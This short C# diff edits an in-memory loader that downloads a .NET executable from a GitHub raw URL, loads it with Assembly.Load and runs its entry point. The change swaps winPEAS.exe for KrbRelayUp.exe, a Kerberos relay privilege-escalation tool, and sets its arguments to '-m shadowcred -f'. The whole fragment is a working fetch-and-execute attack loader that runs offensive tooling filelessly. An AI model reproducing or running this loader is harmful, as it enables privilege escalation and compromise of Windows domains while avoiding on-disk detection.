@@ -23,13 +23,13 @@
                    		 	{
                         			System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
 						client.Headers.Add ("user-agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36");
-						MemoryStream  ms = new MemoryStream(client.DownloadData("https://github.com/zabelsa01/scripts/raw/master/security/binaries/winPEAS.exe"));
+						MemoryStream  ms = new MemoryStream(client.DownloadData("https://github.com/zabelsa01/scripts/raw/master/security/binaries/KrbRelayUp.exe"));
 						BinaryReader br = new BinaryReader(ms);
 						byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
 						ms.Close();
 						br.Close();
 						Assembly a = Assembly.Load(bin);
-						string[] args = new string[] {""};
+						string[] args = new string[] {"-m shadowcred","-f"};
 						try
 						{
 							a.EntryPoint.Invoke(null, new object[] { args });
